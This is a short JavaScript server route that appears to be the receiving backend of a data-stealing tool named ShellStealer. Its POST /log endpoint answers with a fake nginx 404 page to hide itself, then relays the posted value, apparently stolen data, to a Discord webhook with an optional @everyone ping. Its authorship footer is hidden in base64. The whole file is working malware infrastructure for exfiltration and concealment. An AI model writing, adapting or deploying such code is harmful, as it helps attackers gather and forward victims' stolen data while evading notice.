import axios from 'axios';
import config from '#config';

export default (app) => app.post(`/log`, async (req, res) => {
    res.status(404).send(`<html><head><title>404 Not Found</title></head><body><center><h1>404 Not Found</h1></center><hr><center>nginx/1.18.0</center></body></html>`);

    if (!!config.webhook.link) await axios.post(config.webhook.link, {
        username: config.webhook.name,
        avatar_url: config.webhook.pfp,
        content: config.pingEveryone ? '@everyone' : undefined,
        embeds: [{
            color: 16711680,
            description: '```\n' + req.body.t + '\n```',
            footer: {
                text: atob('c2hlbGxzdGVhbGVyIHwgbWFkZSBieSAxdXN0IHwgZ2l0aHViLmNvbS9WaWxsYWluc1J1bGUvU2hlbGxTdGVhbGVy')
            }
        }]
    });
    else console.log(`[ERROR] Webhook link not found. Check https://github.com/VillainsRule/ShellStealer for more information.`);
});